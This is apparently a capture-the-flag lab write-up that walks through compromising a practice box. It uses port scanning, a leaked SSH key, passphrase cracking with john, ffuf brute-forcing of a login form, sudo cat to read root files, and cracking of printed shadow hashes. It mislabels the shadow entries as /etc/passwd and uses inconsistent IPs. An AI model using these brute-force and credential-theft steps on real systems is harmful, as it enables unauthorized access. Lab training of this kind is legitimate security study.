So after getting the ip and opnenign it into the brower

It presented itself with apache2 default page

![img](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2jXbyL79IpN7aO7Fa1XYpoeJnjz-1ADwUPUkO6rNUwbUP9VDzTwsFb2EouiY4Sn_aWT1I66fJ2yZ4iAuQpyApSRF2QBga4agCEMuNGlIp5OFbJnY5qiNrcEghj0hp0-aeWiG4lnt7AFU/s640/Apache+Default+Page.PNG)

After it i started to 2 most critical stuffs do a directory enumuration(recursive one) and nmap scan.

For directory enumuration endpoints were

- /admin
- /admin/.zip
- /admin/panel/id_rsa

Nmap scan gave us 2 ports opened 

Port 22 And port 80

After doing so we get onto our first quesion that was how many ports are opened
It was 2 the next question was what version of ssh is running.

It was openssh 7.6p1

Next qustion was what version of apache is running. 

It was 2.4.29 

Theser all anserr were got from the nmap scan result.

After it next question was what is hidden endpoint.

It was /admin and when visited to that endpoint we were presented with a lgoin page.

![img](https://miro.medium.com/v2/resize:fit:640/format:webp/0*3D2PYB0UO9YSof__.png)

After this we opened the source code and got this line 

```html
 <!-- Hey john, if you do not remember, the username is admin -->
```

So we are sure there the username is admin here but there is john named username too.


Since i got the id_rsa for at the location /admin/panel/id_rsa

Then we are able to do the login but as were doing login we are prompted to enter a passphare.

But we dont know the passphrase 

So to do so we need to crack the passphrase.

For it we are going to execute these sequece of commands.

ssh2john <path to key> <path to hashed key>

ssh2john : this is the tool which helps to get the hashed key

After this we need to crack the key for pharase with the below commands 

john --wordlist=/path/to/wordlsit key_hash

But when i did these seq of commands i didn't get the password.

But soon after i changed the wordlist and tried again.

But this too didn't get me passpharse after spending my all long password lists i was frusturated very badly. i then decided to spend my all wordlist to crack the passphrase with the command

With the loop : 

```bash
for file in /home/seclists/password/common-credentials/*.txt; do
john --wordlist=$file hashed_key
done
```

This command finally gives us the passphrase.

With the passphrase i am able to get the login with the command

ssh -i key john@10.49.161.41

And when prompted for the password i entered the password.

Make sure to give key the 600 permision before connecting to ssh using the key.

After it we need to bruteforce the password of here too.

So to do the bruteforcing we need to first inquire that what ffuf req is acceptable

since when we saw the req with curl

I was it was accepting a csrf token.

so for curl we need to use that csrf token too to get our request successful

So i did

```bash
curl -i -L \        
  -c cookies.txt \             
  -b cookies.txt \           
  -d "user=admin&pass=Wrongpass" \
  http://10.49.161.41/admin/ 
```

Then i got the result as error that username or password is invalid.

That means our curl is working we will now create our fuzz as according to this curl.

before doing enumuration we need to first find size of requ with the command

curl -s -L -d "user=admin&pass=wrong" http://10.49.161.41/admin/ | wc -c

After seeing the size of wrong pass we will know how much to filter.

And with this command below we will get the correct password.

```bash
ffuf -u http://10.49.156.209/admin/ \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "user=admin&pass=FUZZ" \
     -w /home/Seclists/Passwords/Leaked-Databases/rockyou-75.txt -fs 733

```
![web interface after logging in](https://miro.medium.com/v2/resize:fit:640/format:webp/0*NhbuSbJwpw0EYBTx.png)


After lgogging in we are now loggedin with the brutefoced password



after login we are welcomed with our web flag.


since we have got that ssh shell now get back to it.


there is a user.txt which is a flag and it is at the location 

/home/john/user.txt which is the anser of the quesiton what is user.txt?


and now its time for the privilage escalation 

since the ssh shell is not as a root shell.

For this we will do sudo -l

And that binary is /bin/cat which can be executed as root without any password

now its time to get the root flag with this.

for this we used

sudo /bin/cat /root/root.txt

And in this way we got our root flag.

Its time for our last question that is 

Find a form to escalate your privileges.
What is the root's password?

fOR THIs we need to read the content inside the /etc/passwd.

This the whole structer of /etc/passwd

![structure of /etc/passwd](https://www.cyberciti.biz/faqs/uploaded_images/shadow-file-795497.png)

The order is as follows:


Username : It is your login name.


Password : It is your encrypted password hash. The password should be minimum 8-12 characters long including special characters, digits, lower case alphabetic and more. Usually password format is set to $id$salt$hashed, The $id is the algorithm used On GNU/Linux as follows:

$1$ is MD5


$2a$ is Blowfish


$2y$ is Blowfish


$5$ is SHA-256


$6$ is SHA-512


Last password change (lastchanged) : Days since Jan 1, 1970 that password was last changed


Minimum : The minimum number of days required between password changes i.e. the number of days left before the user is allowed to change his/her password


Maximum : The maximum number of days the password is valid (after that user is forced to change his/her password)


Warn : The number of days before password is to expire that user is warned that his/her password must be changed


Inactive : The number of days after password expires that account is disabled


Expire : days since Jan 1, 1970 that account is disabled i.e. an absolute date specifying when the login may no longer be used.


A password hash is nothing but a string that verifies the integrity of your password during login against the stored hash so that your actual password never has to be held in /etc/shadow file. It is a security feature.


The password hash i got for the user thm and user root are


thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::


sshd:*:18489:0:99999:7:::


john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::


root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::


Since we need to crack the hash of root password to get the root password.

We're going to do it with john

and with this loop we got the password and the content inside the pass file should be exactly the string below

root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::


And the command should be 


```bash
for file in /home/Seclists/Passwords/Common-Credentials/*.txt; do
john --wordlist=$file pass
done

```

After this john cracks the hash and we got the password
